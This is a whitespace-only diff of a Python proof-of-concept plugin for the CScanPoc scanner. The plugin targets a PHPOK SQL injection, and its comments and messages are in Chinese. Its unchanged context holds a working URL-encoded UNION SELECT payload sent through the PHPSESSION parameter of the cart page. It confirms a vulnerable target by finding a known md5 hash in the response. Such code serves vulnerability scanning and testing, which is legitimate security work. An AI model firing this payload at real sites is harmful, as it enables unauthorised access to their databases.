@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import random
 
+
 class Vuln(ABVuln):
     vuln_id = 'PHPOK_0012'  # 平台漏洞编号，留空
     name = 'PHPOK SQL注入'  # 漏洞名称
@@ -35,7 +36,6 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-
             payload = "/index.php?c=cart&PHPSESSION=%27%20union%20select%20%27%5C%27%20union%20select%201%2C2%2C3%2Cmd5%28c%29%2C5%2Cdatabase%28%29%2C7%23%27%23"
             url = self.target + payload
             r = requests.get(url)
@@ -43,12 +43,13 @@ class Poc(ABPoc):
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
